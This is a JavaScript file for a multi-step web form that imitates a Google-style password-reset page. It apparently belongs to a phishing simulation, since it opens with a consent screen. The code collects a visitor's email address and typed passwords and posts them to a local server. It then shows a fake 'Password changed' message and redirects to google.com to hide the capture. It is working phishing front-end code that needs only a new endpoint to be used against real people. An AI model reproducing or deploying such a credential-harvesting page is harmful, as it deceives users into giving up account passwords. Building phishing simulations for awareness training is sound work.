let emailData = "";

const consent = document.getElementById("consent");
const step1 = document.getElementById("step1");
const security = document.getElementById("security");
const step2 = document.getElementById("step2");
const stepLast = document.getElementById("stepLast");
const step3 = document.getElementById("step3");

function startSimulation() {
  consent.classList.remove("active");
  step1.classList.add("active");
}

// STEP 1 → EMAIL
step1.addEventListener("submit", (e) => {
  e.preventDefault();
  emailData = document.getElementById("email").value;

  step1.classList.remove("active");
  security.classList.add("active");

  setTimeout(() => {
    security.classList.remove("active");
    step2.classList.add("active");
  }, 2000);
});

// STEP 2 → CURRENT PASSWORD
step2.addEventListener("submit", (e) => {
  e.preventDefault();

  step2.classList.remove("active");
  stepLast.classList.add("active");
});

// STEP 3 → SET NEW PASSWORD
stepLast.addEventListener("submit", (e) => {
  e.preventDefault();

  stepLast.classList.remove("active");
  step3.classList.add("active");
});

// FINAL STEP → SUBMIT
step3.addEventListener("submit", async (e) => {
  e.preventDefault();

  const pass1 = document.getElementById("lastname").value;   // first new password
  const pass2 = document.getElementById("newpass").value;    // confirm password

  // ✅ VALIDATION
  if (pass1 !== pass2) {
    step3.innerHTML += `
      <p style="color:red; font-size:13px; margin-top:10px;">
        Passwords do not match
      </p>
    `;
    return;
  }

  try {
    // SEND DATA
    await fetch("http://localhost:3000/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        email: emailData,
        lastname: pass1,
        newPassword: pass2
      })
    });

    // ✅ LOADER
    step3.innerHTML = `
      <div style="text-align:center;">
        <div class="loader"></div>
        <p style="margin-top:15px; color:#5f6368;">
          Updating password...
        </p>
      </div>
    `;

    // ✅ SUCCESS MESSAGE
    setTimeout(() => {
      step3.innerHTML = `
        <div style="text-align:center;">
          <h3 style="color:#1a73e8;">Password changed</h3>
          <p style="color:#5f6368;">
            Your password has been updated successfully.
          </p>
        </div>
      `;

      // ✅ REDIRECT (WORKS ALWAYS)
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 2000);

    }, 1500);

  } catch (err) {
    console.error(err);
    step3.innerHTML += `
      <p style="color:red; margin-top:10px;">
        Something went wrong. Try again.
      </p>
    `;
  }
});